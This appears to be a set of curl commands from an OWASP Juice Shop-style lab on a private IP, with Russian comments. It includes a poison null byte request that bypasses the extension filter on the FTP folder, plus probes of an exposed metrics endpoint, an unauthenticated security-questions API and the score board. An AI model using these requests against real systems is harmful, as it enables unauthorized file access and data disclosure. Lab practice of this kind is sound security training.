# Poison Null Byte — обход фильтра расширений
curl "http://172.20.0.106:3000/ftp/legal.md%2500.md"

# листинг FTP-директории
curl "http://172.20.0.106:3000/ftp/"

# metrics endpoint
curl "http://172.20.0.106:3000/metrics"

# Security Questions API без авторизации
curl "http://172.20.0.106:3000/api/SecurityQuestions" | jq

# Score Board
curl "http://172.20.0.106:3000/score-board"
